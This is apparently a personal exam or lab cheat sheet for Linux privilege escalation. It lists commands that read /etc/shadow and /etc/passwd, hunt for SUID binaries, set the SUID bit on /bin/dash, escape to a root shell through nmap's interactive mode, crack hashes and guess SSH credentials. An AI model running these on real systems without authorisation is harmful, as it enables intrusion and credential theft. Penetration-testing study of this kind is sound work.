# ariel-shin Linux - Privilege Escalation 

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt/proof.txt

## Summary 
* [Process](#Process)
* [Compiling Exploits](Compiling-Exploits)
* [Cracking Passwords](#Cracking-Passwords)
* [Automated Scripts](#Automated-Scripts)
* [What to do when youre stuck](#What-to-do-when-youre-stuck)
* [Resources](#Resources)

## Process
* Reverse Shell
	* Check Different Ports, e.g. 80, 443
* Upgrade the shell
```
python -c 'import pty; pty.spawn(“/bin/sh”)'
```
* We have credentials
```
sudo su
```
* What's the OS? Version? Architecture? 
```os
cat /etc/*-release
uname -i
lsb_release -a #Debian Based OS
```

* Who are we? Where are we?
```who
id 
pwd
```

* Bash History 
```
history
cat .bash_history
```
* Google anything that looks weird
* See if root is running anything that showed up in the history

* Who uses the box? What users?
```passwd
cat /etc/passwd
grep -vE "nologin | false" /etc/passwd
```

* Can we access /etc/shadow?
```
cat /etc/shadow
ls -al /etc/shadow
```

* What's currently running on the box? What active network services are there?
```ps
ps aux
netstat -antup
```

* Installed? Kernel?
```
dpkg -l #Debian based OS
rpm -qa #CentOS?openSUSE
uname -a # Kernel Exploits
```

* Sensitive Files
```config
find . -iname '*config'
```

* mysql
```mysql
mysql -uroot -ppassword -e 'show databases;' //no spaces for password
```

* See who's logged in 
```w
w
```

Display the list of all the users logged in and out since the file /var/log/wtmp was created
```last
last root 
```

* Find places to write files to
	* View File Permissions
	```
	ls -al
	```

	* If the above command doesn't work, view fstab
	```
	cat /etc/fstab
	//attempt to write to different locations in <mount point>
	echo "a" > test.txt
	```

* Check sticky bit
```
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```
	* Can also change SUID
	```
	chmod 4755 /bin/dash
	```

* Discover tools
```
find / -name wget
find / -name nc<em>
find / -name netcat</em>
find / -name tftp*
find / -name ftp
```

* Look at the original low privilege shell for notes 
* Look for interesting things e.g. nmap 
```
sudo nmap --interactive
nmap> !sh
id 
```
[Back](#summary)

## Compiling Exploits
* gcc
``` 
gcc exploit.c -o exploit
./exploit
```
* mingw32
``` 
TO DO
```
[Back](#summary)

## Cracking Passwords
* Google it
* Search on hashkiller.co.uk
* John The Ripper
```
john textfile
```

[Back](#summary)

## Automated Scripts
* [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
* [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
```
LinEnum.sh -t
```
	* t: thorough
* [Unix-Privesc-Check](https://github.com/pentestmonkey/unix-privesc-check)
* [Linux Exploit Suggester](https://tools.kali.org/exploitation-tools/linux-exploit-suggester)

[Back](#summary)

## Resources
* [g0tmilk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Back](#summary)

## What to do when you're stuck
* [Calm down](https://www.youtube.com/watch?v=F28MGLlpP90)
* Take a breath 
* Look for usernames that could have been found
	* Try to ssh by guessing credentials
* Google anything running by root

[Back](#summary)